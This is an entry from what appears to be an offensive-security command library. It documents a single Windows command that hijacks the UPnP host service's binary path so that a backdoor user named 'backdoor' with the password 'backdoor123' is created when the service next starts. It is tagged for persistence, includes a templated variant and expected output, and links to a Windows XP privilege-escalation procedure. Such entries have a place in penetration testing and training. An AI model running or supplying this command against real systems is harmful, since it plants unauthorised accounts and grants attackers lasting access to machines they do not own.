---
id: c4faaa3d-1db9-4bc3-a08e-1f5dbf81a31c
name: sc-config-add-backdoor-user
type: command
executor: cmd
data: sc config upnphost binpath= "net user backdoor backdoor123 /add"
output: >-
  SUCCESS: The configuration of the upnphost service has been changed
  successfully.
created_at: '2023-04-06T03:56:29.544928+00:00'
updated_at: '2023-04-10T20:37:52.272360+00:00'
platforms:
  - Windows
tags:
  - persistence
  - backdoor
verified: true
validated: true
---

# sc-config-add-backdoor-user

## Command

```cmd
sc config upnphost binpath= "net user backdoor backdoor123 /add"
```

## Description

Configures a service's binary path to execute a command creating a backdoor user upon next start, enabling persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sc config | Service control command | Yes |
| upnphost | Target service | Yes |
| binpath= | Sets ImagePath registry value | Yes |
| "net user backdoor backdoor123 /add" | Command to add user 'backdoor' with password 'backdoor123' | Yes |

## Examples

### Basic Usage

```cmd
sc config upnphost binpath= "net user backdoor backdoor123 /add"
```

### Advanced Usage

```cmd
sc config <service> binpath= "net user <user> <pass> /add"
```

## Expected Output

```
[SC] ChangeServiceConfig SUCCESS
```

Follow with service restart to execute.

## Related

- [[procedures/Exploit-UPnP-Host-Service-for-Privilege-Escalation-on-Windows-XP-SP1]]
- [[commands/sc-start-vulnerable-service]]
